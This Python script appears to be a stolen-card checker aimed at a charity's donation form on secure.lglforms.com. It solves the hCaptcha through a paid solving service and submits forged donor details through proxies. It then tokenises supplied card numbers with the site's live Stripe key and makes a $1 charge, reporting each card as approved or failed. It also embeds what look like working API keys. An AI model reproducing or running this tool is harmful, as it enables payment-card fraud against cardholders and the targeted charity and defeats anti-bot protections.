import httpx
import asyncio
import time
import re
api_key = "CAP-02DB3E5188C3DDD58C43DCF9B69FE560" 
site_key = "463b917e-e264-403f-ad34-34af0ee10294" 
site_url = "https://secure.lglforms.com"  

async def capsolver(client):
    payload = {
        "clientKey": api_key,
        "task": {
            "type": 'HCaptchaTaskProxyLess',
            "websiteKey": site_key,
            "websiteURL": site_url
        }
    }
    res = await client.post("https://api.capsolver.com/createTask", json=payload)
    resp = res.json()
    task_id = resp.get("taskId")
    while True:
        await asyncio.sleep(1)
        payload = {"clientKey": api_key, "taskId": task_id}
        res = await client.post("https://api.capsolver.com/getTaskResult", json=payload)
        resp = res.json()
        status = resp.get("status")
        if status == "ready":
            return resp.get("solution", {}).get('gRecaptchaResponse')
        if status == "failed" or resp.get("errorId"):
            print("Solve failed! response:", res.text)
            return

async def get_str(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

async def stripeccn(cc, mes, ano, cvv, proxyg):
    async with httpx.AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as client:
        response = await client.get('https://secure.lglforms.com/form_engine/s/ae_zYcdJfAmYMvmG8fdIFQ')
        token = await get_str(response.text, 'authenticity_token" value="', '"')
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydzGlSqO29vUNGcLD',
            'Origin': 'https://secure.lglforms.com',
            'Referer': 'https://secure.lglforms.com/form_engine/s/ae_zYcdJfAmYMvmG8fdIFQ',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        files = {
            'not_secure': (None, ''),
            'authenticity_token': (None, token),
            'submission[origin]': (None, ''),
            'submission[args][field_17]': (None, 'General Donation'),
            'submission[args][field_6]': (None, 'Sebastian'),
            'submission[args][field_7]': (None, 'Gutierrez'),
            'submission[args][field_9]': (None, 'sdadnsajn@gmail.com'),
            'field_9_verification': (None, ''),
            'submission[args][field_11]': (None, '103-105 Central Avenue'),
            'submission[args][field_12]': (None, ''),
            'submission[args][field_13]': (None, 'Orange'),
            'submission[args][field_14]': (None, 'NJ'),
            'submission[args][field_15]': (None, '07050-3824'),
            'submission[args][field_16]': (None, 'US'),
            'submission[args][field_18]': (None, ''),
            'submission[args][field_28][description]': (None, ''),
            'submission[args][field_28][other]': (None, '1'),
            'submission[args][field_28][recurring_schedule]': (None, '0'),
            'total_amt': (None, '1'),
            'submit': (None, 'Enter payment information'),
        }

        req2 = await client.post('https://secure.lglforms.com/form_engine/ae_zYcdJfAmYMvmG8fdIFQ', headers=headers, files=files)
        captcha_token = await capsolver(client)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://secure.lglforms.com/form_engine/s/ae_zYcdJfAmYMvmG8fdIFQ',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        req3 = await client.post('https://m.stripe.com/6', headers=headers)
        req3_json = req3.json()
        muid = req3_json['guid']
        guid = req3_json['muid']
        sid = req3_json['sid']

        headers = {
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        }

        data = f'guid={guid}&muid={muid}&sid={sid}&referrer=https%3A%2F%2Fsecure.lglforms.com&time_on_page=904351&card[name]=Pene+Pene&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_zip]=10010&radar_options[hcaptcha_token]={captcha_token}&payment_user_agent=stripe.js%2F08de58320f%3B+stripe-js-v3%2F08de58320f%3B+split-card-element&pasted_fields=number&key=pk_live_51P6GBzIOH88KQOUrIqiXDsUVPEg7BEyMWyknmmcqseVlWswnUHxfLHSM5S2ukD2qstIazGyJQvONijoOGpRb60Fs00ztCU2wJW'

        req4 = await client.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
        req4_json = req4.json()
        stripetk = req4_json["id"]
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://secure.lglforms.com/form_engine/r/38dbe590-9b70-42b3-a5c0-ff45a799fd45/finalize',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        req5 = await client.get('https://secure.lglforms.com/form_engine/r/38dbe590-9b70-42b3-a5c0-ff45a799fd45/finalize', headers=headers)
        messages = [li.strip() for li in re.findall(r'<li>(.*?)</li>', req5.text, re.DOTALL)]
        
    if any(msg in ["Success", "thank you", "thanks"] for msg in messages):
            mensaje = "Charged 1$"
            status = "Approved ✅"
    else:
            mensaje = messages[0] if messages else "No message found"
            if "Your card has insufficient funds" in mensaje:
                status = "Approved"
            else:
                status = "Failed"
    return mensaje,status